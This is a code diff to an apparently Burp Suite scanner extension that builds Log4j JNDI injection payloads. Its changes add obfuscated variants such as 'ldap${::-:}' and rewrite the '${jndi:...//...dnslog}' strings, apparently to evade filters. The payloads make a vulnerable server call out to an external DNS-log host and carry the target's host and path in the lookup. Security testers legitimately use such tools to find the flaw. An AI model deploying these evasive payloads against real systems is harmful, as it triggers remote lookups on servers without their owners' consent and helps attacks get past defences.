@@ -722,7 +722,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 BurpExtender.this.fieldd1 = new JTextField(); // jndi参数
 
                 JLabel labell2 = new JLabel("dnsldaprmi:");
-                String[] sg = { "dns", "ldap", "rmi" };
+                String[] sg = { "dns", "ldap", "rmi" ,"dns${::-:}", "ldap${::-:}" ,"rmi${::-:}"};
                 BurpExtender.this.fieldd2 = new JComboBox(sg); // 协议名称dns ldap rmi
 
                 JLabel labell3 = new JLabel("white lists:");
@@ -1038,6 +1038,13 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     fieldd2.setSelectedIndex(1);
                 if (dnsldaprmi_param.equals("rmi"))
                     fieldd2.setSelectedIndex(2);
+                if (dnsldaprmi_param.equals("dns${::-:}"))
+                    fieldd2.setSelectedIndex(3);
+                if (dnsldaprmi_param.equals("ldap${::-:}"))
+                    fieldd2.setSelectedIndex(4);
+                if (dnsldaprmi_param.equals("rmi${::-:}"))
+                    fieldd2.setSelectedIndex(5);
+
 
                 String ceyetoken_param = FileGetValue(f, "ceyetoken"); // ceye的token 参数
                 field2.setText(ceyetoken_param);
@@ -1087,10 +1094,11 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
     public String vulnurl_param (String vulnurl, int i ,Boolean needincreasing){
         String vulnurl_total = "";
         if (needincreasing) {
-            String[] vulnurls = vulnurl.split("://", 2);
-            vulnurl_total = vulnurl_total + vulnurls[0] + "://" + i + "." + vulnurls[1];
+            String[] vulnurls = vulnurl.split("//", 2);
+            vulnurl_total = vulnurl_total + vulnurls[0] + "//" + i + "." + vulnurls[1];
         }else
             vulnurl_total = vulnurl;
+//        vulnurl_total = vulnurl_total.replace(".","${::-.}");
         return vulnurl_total;
     }
 
@@ -1299,10 +1307,13 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
         String random_str = RandomStringUtils.randomAlphanumeric(3); //生成指定长度的字母和数字的随机组合字符串
 
-        String vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "://" + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20test}";
+        if (!this.dnsldaprmi.contains(":"))
+            this.dnsldaprmi = this.dnsldaprmi + ":";
+
+        String vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "//" + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20test}";
 
         if (this.isip && this.privatedns){
-            vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "://" + this.logxn_dnslog.trim() + "/%20test}";
+            vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "//" + this.logxn_dnslog.trim() + "/%20test}";
         }
 
         String uri_total = "";
@@ -2132,7 +2143,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 this.jndiparam = this.jndiparam + ":";
             String random_str = RandomStringUtils.randomAlphanumeric(3); //生成指定长度的字母和数字的随机组合字符串
 
-            String vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "://" + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20test}";
+            if (!this.dnsldaprmi.contains(":"))
+                this.dnsldaprmi = this.dnsldaprmi + ":";
+
+            String vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "//" + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20test}";
 //            String vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "://" + firstheaders[0].trim() + "." + host  + uri + "."+ this.logxn_dnslog.trim() + "/%20test}";
 
             if (this.isip && this.privatedns){
